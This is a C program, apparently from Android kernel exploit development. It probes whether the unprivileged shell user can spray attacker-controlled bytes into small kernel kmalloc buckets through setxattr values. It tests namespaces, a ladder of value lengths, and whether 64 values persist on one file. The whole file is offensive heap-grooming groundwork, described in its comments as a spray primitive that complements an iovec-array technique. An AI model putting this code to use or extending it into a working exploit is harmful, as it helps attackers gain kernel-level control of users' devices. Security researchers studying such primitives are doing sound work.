#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/xattr.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/vfs.h>

/* Probe: can uid 2000 park attacker-chosen bytes in the SMALL kmalloc buckets?
 * A setxattr value is kmalloc(value_len) and stays live in the inode's xattr
 * list until I remove it or exit, which is a spray primitive for buckets the
 * iovec-array trick cannot reach (64/96/128). */

static const char *NS[] = { "user.", "trusted.", "security.", "system." };
static const char *FILE_CAND[] = {
    "/data/local/tmp/xspray_f1",
    "/data/local/tmp/xspray_f2",
    "/storage/self/primary/xspray_f3",
};

int main(void)
{
    char buf[2048];
    unsigned char fill;
    int rc;

    setvbuf(stdout, NULL, _IONBF, 0);

    /* what filesystem is /data/local/tmp on? */
    {
        struct statfs sf;
        if (statfs("/data/local/tmp", &sf) == 0)
            printf("statfs(/data/local/tmp): f_type=0x%lx f_namelen=%ld\n",
                   (unsigned long)sf.f_type, (long)sf.f_namelen);
        else
            printf("statfs failed: %s\n", strerror(errno));
    }

    for (unsigned i = 0; i < sizeof FILE_CAND / sizeof FILE_CAND[0]; i++) {
        int fd = open(FILE_CAND[i], O_RDWR | O_CREAT | O_TRUNC, 0666);
        if (fd < 0) { printf("open %s: %s\n", FILE_CAND[i], strerror(errno)); continue; }
        close(fd);
        printf("file %s ok\n", FILE_CAND[i]);

        for (unsigned n = 0; n < sizeof NS / sizeof NS[0]; n++) {
            char name[64];
            snprintf(name, sizeof name, "%sx", NS[n]);
            memset(buf, 0x41, 64);
            errno = 0;
            rc = setxattr(FILE_CAND[i], name, buf, 64, 0);
            printf("  ns '%-10s' setxattr(64) rc=%d errno=%d %s\n",
                   NS[n], rc, rc ? errno : 0, rc ? strerror(errno) : "OK");
        }

        /* length ladder on the first namespace that worked */
        static const int lens[] = { 1, 33, 65, 100, 129, 193, 257, 400, 513, 900, 1025, 1500 };
        for (unsigned l = 0; l < sizeof lens / sizeof lens[0]; l++) {
            int len = lens[l];
            fill = (unsigned char)(0x30 + (int)l);
            memset(buf, fill, (size_t)len);
            errno = 0;
            rc = setxattr(FILE_CAND[i], "user.probe", buf, (size_t)len, 0);
            printf("  user.probe len=%4d rc=%d errno=%d %s\n",
                   len, rc, rc ? errno : 0, rc ? strerror(errno) : "OK");
        }
        /* does it persist (i.e. can I keep N values alive)? */
        {
            char nm[32];
            int ok = 0;
            for (int k = 0; k < 64; k++) {
                snprintf(nm, sizeof nm, "user.k%d", k);
                memset(buf, 0x5A, 100);
                if (setxattr(FILE_CAND[i], nm, buf, 100, 0) == 0) ok++;
            }
            printf("  stored %d/64 xattrs of 100 B on the same file\n", ok);
            for (int k = 0; k < 64; k++) {
                snprintf(nm, sizeof nm, "user.k%d", k);
                (void)removexattr(FILE_CAND[i], nm);
            }
        }
        (void)removexattr(FILE_CAND[i], "user.probe");
        (void)removexattr(FILE_CAND[i], "user.x");
    }
    fill = 0; (void)fill;
    return 0;
}
